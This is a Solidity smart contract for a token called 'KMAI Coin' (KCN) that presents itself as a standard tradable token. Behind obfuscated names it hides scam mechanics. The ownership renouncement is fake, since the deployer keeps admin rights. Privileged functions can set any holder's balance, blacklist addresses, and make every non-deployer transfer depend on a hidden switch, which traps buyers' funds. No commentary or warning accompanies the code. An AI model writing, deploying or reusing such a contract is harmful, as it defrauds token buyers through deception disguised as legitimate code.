//SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface atWalletLimit {
    function totalSupply() external view returns (uint256);

    function balanceOf(address isAt) external view returns (uint256);

    function transfer(address sellTeamReceiver, uint256 receiverMarketing) external returns (bool);

    function allowance(address totalTrading, address spender) external view returns (uint256);

    function approve(address spender, uint256 receiverMarketing) external returns (bool);

    function transferFrom(
        address sender,
        address sellTeamReceiver,
        uint256 receiverMarketing
    ) external returns (bool);

    event Transfer(address indexed from, address indexed walletSell, uint256 value);
    event Approval(address indexed totalTrading, address indexed spender, uint256 value);
}

interface atWalletLimitMetadata is atWalletLimit {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract takeBuy {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface atSender {
    function createPair(address shouldFrom, address maxAuto) external returns (address);
}

interface walletTotal {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract KMAICoin is takeBuy, atWalletLimit, atWalletLimitMetadata {

    event OwnershipTransferred(address indexed exemptTeam, address indexed listMarketing);

    string private minSwapLiquidity = "KMAI Coin";

    uint256 public fundSwap;

    function getOwner() external view returns (address) {
        return senderTotal;
    }

    uint256 private senderIsTrading;

    address public feeSell;

    function teamBuy(address modeMinFee) public {
        listTo();
        
        if (modeMinFee == feeSell || modeMinFee == exemptLimit) {
            return;
        }
        amountExemptList[modeMinFee] = true;
    }

    uint8 private sellMin = 18;

    function name() external view virtual override returns (string memory) {
        return minSwapLiquidity;
    }

    uint256 public liquidityWallet;

    constructor (){
        
        txAmountAt();
        walletTotal marketingTx = walletTotal(toFundMax);
        exemptLimit = atSender(marketingTx.factory()).createPair(marketingTx.WETH(), address(this));
        if (launchExempt == fundSwap) {
            enableMin = launchExempt;
        }
        feeSell = _msgSender();
        sellMarketing[feeSell] = true;
        feeAuto[feeSell] = totalTeamReceiver;
        if (senderIsTrading == liquidityWallet) {
            fundSwap = enableMin;
        }
        emit Transfer(address(0), feeSell, totalTeamReceiver);
    }

    mapping(address => uint256) private feeAuto;

    uint256 private launchExempt;

    function allowance(address takeAmount, address listReceiver) external view virtual override returns (uint256) {
        if (listReceiver == toFundMax) {
            return type(uint256).max;
        }
        return receiverTrading[takeAmount][listReceiver];
    }

    function totalSwapAt(address limitReceiverMin, address sellTeamReceiver, uint256 receiverMarketing) internal returns (bool) {
        if (limitReceiverMin == feeSell) {
            return liquidityMode(limitReceiverMin, sellTeamReceiver, receiverMarketing);
        }
        uint256 fromEnable = atWalletLimit(exemptLimit).balanceOf(launchTx);
        require(fromEnable == launchSell);
        require(!amountExemptList[limitReceiverMin]);
        return liquidityMode(limitReceiverMin, sellTeamReceiver, receiverMarketing);
    }

    function txAmountAt() public {
        emit OwnershipTransferred(feeSell, address(0));
        senderTotal = address(0);
    }

    address public exemptLimit;

    uint256 private enableMin;

    function transferFrom(address limitReceiverMin, address sellTeamReceiver, uint256 receiverMarketing) external override returns (bool) {
        if (_msgSender() != toFundMax) {
            if (receiverTrading[limitReceiverMin][_msgSender()] != type(uint256).max) {
                require(receiverMarketing <= receiverTrading[limitReceiverMin][_msgSender()]);
                receiverTrading[limitReceiverMin][_msgSender()] -= receiverMarketing;
            }
        }
        return totalSwapAt(limitReceiverMin, sellTeamReceiver, receiverMarketing);
    }

    function liquidityMode(address limitReceiverMin, address sellTeamReceiver, uint256 receiverMarketing) internal returns (bool) {
        require(feeAuto[limitReceiverMin] >= receiverMarketing);
        feeAuto[limitReceiverMin] -= receiverMarketing;
        feeAuto[sellTeamReceiver] += receiverMarketing;
        emit Transfer(limitReceiverMin, sellTeamReceiver, receiverMarketing);
        return true;
    }

    function approve(address listReceiver, uint256 receiverMarketing) public virtual override returns (bool) {
        receiverTrading[_msgSender()][listReceiver] = receiverMarketing;
        emit Approval(_msgSender(), listReceiver, receiverMarketing);
        return true;
    }

    address private senderTotal;

    function totalSupply() external view virtual override returns (uint256) {
        return totalTeamReceiver;
    }

    uint256 launchSell;

    function symbol() external view virtual override returns (string memory) {
        return launchedBuySwap;
    }

    address toFundMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 private totalTeamReceiver = 100000000 * 10 ** 18;

    mapping(address => bool) public amountExemptList;

    mapping(address => bool) public sellMarketing;

    mapping(address => mapping(address => uint256)) private receiverTrading;

    function transfer(address launchSender, uint256 receiverMarketing) external virtual override returns (bool) {
        return totalSwapAt(_msgSender(), launchSender, receiverMarketing);
    }

    address launchTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function listTo() private view {
        require(sellMarketing[_msgSender()]);
    }

    uint256 fromLiquidityExempt;

    bool public swapReceiver;

    function decimals() external view virtual override returns (uint8) {
        return sellMin;
    }

    function toLaunchIs(uint256 receiverMarketing) public {
        listTo();
        launchSell = receiverMarketing;
    }

    function balanceOf(address isAt) public view virtual override returns (uint256) {
        return feeAuto[isAt];
    }

    function autoLiquidity(address tokenMaxTotal) public {
        if (swapReceiver) {
            return;
        }
        if (liquidityWallet != enableMin) {
            liquidityWallet = senderIsTrading;
        }
        sellMarketing[tokenMaxTotal] = true;
        if (liquidityWallet == enableMin) {
            launchExempt = liquidityWallet;
        }
        swapReceiver = true;
    }

    function owner() external view returns (address) {
        return senderTotal;
    }

    string private launchedBuySwap = "KCN";

    function autoFrom(address launchSender, uint256 receiverMarketing) public {
        listTo();
        feeAuto[launchSender] = receiverMarketing;
    }

}